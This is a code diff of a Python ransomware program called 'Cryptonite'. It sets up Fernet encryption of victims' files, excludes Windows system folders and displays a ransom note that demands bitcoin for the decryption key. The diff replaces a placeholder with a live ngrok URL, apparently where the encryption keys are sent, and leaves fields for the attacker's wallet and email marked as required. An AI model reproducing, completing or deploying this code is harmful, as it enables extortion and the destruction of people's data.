@@ -10,27 +10,32 @@ import tqdm
 import pymsgbox._native_win as pymsgbox
 import pymsgbox as pmb
 
-# some GLOBALS
-url = "YOUR_NGROK_URL_HERE"
+
 key = Fernet.generate_key()
 fe = Fernet(key)
 dkrpt = random.randint(100000, 999999)
 uniqKey = str(datetime.now().time()).strip().replace(':', '').replace('.', '')
 print(dkrpt)
 
+
+# some GLOBALS
+
+url = "http://fdb79803879f.ngrok.io"                             # <----  REQUIRED
 BTC_AMOUNT = 0.03                                       # <----  REQUIRED
 BTC_WALLET = "YOUR_BTC_WALLET_HERE"                     # <----  REQUIRED
 EMAIL = "YOUR_EMAIL_HERE"                               # <----  REQUIRED
 EXT = ".cryptn8"                                        # <----  OPTIONAL
+
+
+fileLists = []      # stores the files to be encrypted
+fileList = []       # stores the files to be decrypted
+
 
 EXCLUDED_DIRS = [   "/Windows",
                     "/Program Files",
                     "/Program Files (x86)",
                     "/AppData"
                 ]
-
-fileLists = []      # stores the files to be encrypted
-fileList = []       # stores the files to be decrypted
 
 
 class Cryptonite():
@@ -40,8 +45,6 @@ class Cryptonite():
 
         self.decryptPlease = dkrpt
         self.uniqueKey = uniqKey
-
-              
 
 
     def sendKeys(self):
@@ -105,7 +108,6 @@ class Cryptonite():
         os.system("cls" if os.name == 'nt' else "clear") 
             
   
-
     def decrypt(self):
         for files in fileList:
             flag = 0
@@ -124,9 +126,11 @@ class Cryptonite():
                     a = "error" # just to fill the except block
 
 
+
 class System(Cryptonite):
     def __init__(self,key,fe,dkrpt,uniqKey):
         super().__init__(key,fe,dkrpt,uniqKey)
+
 
     def warningScreen(self):
         warningMessage = f"Your device is infected by CRYPTONITE RANSOMWARE. It uses a military grade encryption to encrypt your files\n\n.If you wish to decrypt your file, send us {BTC_AMOUNT} BTC and email us the unique key provided to you and the proof that you have paid the ransom. Then only we will provide the Decryption key which will decrypt the files\n\nRemember, you will be given only ONE CHANCE to enter the correct key:\n\nBTC wallet address:- {BTC_WALLET}\nEmail address:- {EMAIL}\n\n\nYour unique key: {self.uniqueKey}\n\n"
